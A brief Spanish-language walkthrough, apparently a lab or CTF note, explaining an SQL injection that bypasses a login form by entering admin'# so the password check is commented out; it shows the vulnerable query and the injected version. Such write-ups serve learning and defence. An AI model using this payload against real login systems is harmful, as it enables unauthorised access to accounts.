Realizamos una SQL injection a un login form.

No existe validación del nombre de usuario para evitar caracteres especiales.

Agregar un `#` puede comentar el resto de la consulta SQL, la cual vemos que es de la forma
```SQL
SELECT * FROM users WHERE username='admin' AND password='a'
```

Así, añadiremos `'#` para cerrar y comentar el resto de la consulta
```SQL
SELECT * FROM users WHERE username='admin'#' AND password='a'
```
